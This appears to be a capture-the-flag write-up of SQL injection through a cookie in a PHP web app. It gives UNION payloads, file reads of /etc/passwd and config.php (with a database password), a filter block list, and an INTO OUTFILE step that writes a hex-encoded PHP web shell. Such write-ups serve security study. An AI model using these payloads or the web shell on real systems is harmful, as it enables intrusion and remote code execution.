# Foothold
When we look at the web application we find that there's really not much going on. 

There is an ID cookie which is gives a nice big verbose error when we injection SQL syntax. 

We can abuse with sql injection as such.

## Payloads 
- Current User 
`' UNION ALL SELECT NULL,current_user-- -`
`web@localhost`



## File Read
`' UNION ALL SELECT NULL,load_file('/etc/passwd')-- -`
etc/passwd
```
You are number root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
mysql:x:105:108:MySQL Server,,,:/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:109:114::/var/lib/landscape:/usr/sbin/nologin
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
dylan:x:1000:1000:dylan,,,:/home/dylan:/bin/bash
```

Developing on file read we can view stuff like config.php
```
<?php
	$servername = "localhost";
	$username = "web";
	$password = "Cda3RsDJga";
	$dbname = "webapp";

	$dbh = new mysqli($servername, $username, $password, $dbname);
	if ($dbh->connect_error){
		die("Connection failed: ". $dbh->connect_error);
	}


?>
```


Index.php
```
<?php
	$badStrings=array("3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d2f7661722f7777772f646f672f3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a", "DUMPFILE", "SLEEP", "LOADFILE", "AND", ">", "<", "CONCAT", "IF", "ELT", "0,1");
	$stringsLen=count($badStrings);


	require_once "config.php";

	if(!isset($_COOKIE["id"])){
		$cookie = bin2hex(random_bytes(16));
		$queueNum = rand(1,100);
		setcookie("id", $cookie, NULL, "/");
		
		$sql = "INSERT INTO queue VALUES ('". $cookie . "',". $queueNum .")";
		if(!$dbh->query($sql) === TRUE){
			die("Error: " . $dbh->error);
		}
	}
	else {
		$cookie = $_COOKIE["id"];
		for($x=0; $x<$stringsLen;$x++){
			if (strstr($cookie, $badStrings[$x]) !== false){
				die("RCE Attempt detected");
			}
		}
		$sql = "SELECT * FROM queue WHERE userID='". $cookie . "'";
		$result = $dbh->query($sql);
		if(!$result === TRUE){
			die("Error: " . $dbh->error);
		}
		else if ($result->num_rows > 0){
			while($row =  $result->fetch_assoc()){
				$queueNum = $row["queueNum"];
			}
		}
		else{
			$queueNum = "Error";
		}
	}
?>
```

## RCE
```
' UNION SELECT NULL,UNHEX('3c3f7068702073797374656d28245f4745545b27726565275d293b3f3e') INTO OUTFILE '/var/www/html/cbt.php'-- -
```
